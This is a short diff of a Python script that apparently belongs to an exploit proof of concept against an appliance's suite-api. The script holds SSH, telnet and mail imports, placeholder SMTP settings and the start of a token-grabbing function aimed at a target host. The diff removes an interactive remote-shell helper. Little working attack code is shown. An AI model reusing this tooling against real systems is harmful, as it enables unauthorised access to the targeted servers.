@@ -72,7 +72,6 @@ root@photon-machine [ ~ ]#
 import io
 import re
 import sys
-import tty
 import json
 import time
 import socket
@@ -80,14 +79,12 @@ import select
 import random
 import string
 import urllib3
-import termios
 import imaplib
 import paramiko
 import requests
 from base64 import b64encode
 from telnetlib import Telnet
 from threading import Thread
-from paramiko.py3compat import u
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # update these for yourself
@@ -97,33 +94,6 @@ SMTP_SVR = "mail.YYYYYYYYYY.net"
 SMTP_PRT = 587
 SMTP_TLS = True
 SMTP_SSL = False
-
-# borrowed from https://github.com/paramiko/paramiko/blob/main/demos/interactive.py#L41
-def shell(chan):
-    oldtty = termios.tcgetattr(sys.stdin)
-    try:
-        tty.setraw(sys.stdin.fileno())
-        tty.setcbreak(sys.stdin.fileno())
-        chan.settimeout(0.0)
-        while True:
-            r, w, e = select.select([chan, sys.stdin], [], [])
-            if chan in r:
-                try:
-                    x = u(chan.recv(1024))
-                    if len(x) == 0:
-                        sys.stdout.write("\r\n")
-                        break
-                    sys.stdout.write(x)
-                    sys.stdout.flush()
-                except socket.timeout:
-                    pass
-            if sys.stdin in r:
-                x = sys.stdin.read(1)
-                if len(x) == 0:
-                    break
-                chan.send(x)
-    finally:
-        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, oldtty)
 
 def grab_token(target, creds, h):
     uri = f"https://{target}/suite-api/api/auth/token/acquire"
